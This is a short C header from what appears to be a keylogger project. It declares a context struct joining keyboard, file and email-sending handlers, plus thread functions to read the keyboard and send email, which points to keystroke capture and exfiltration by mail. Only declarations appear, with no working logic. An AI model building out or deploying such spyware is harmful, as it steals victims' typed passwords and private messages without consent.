#ifndef Keylogger_H_SENTRY
#define Keylogger_H_SENTRY

#include "keylogger/file_handler.h"
#include "keylogger/keyboard_handler.h"
#include "keylogger/send_email.h"

typedef struct {
    KeyboardHandler keyboard_handler;
    FileHandler file_handler;
    EmailSender sender;
    int fd;
} HandlerContext;

void *read_keyboard(void *arg);
void *send_email(void *arg);
int context_init(HandlerContext *context);
void context_cleanup(HandlerContext *context);

#endif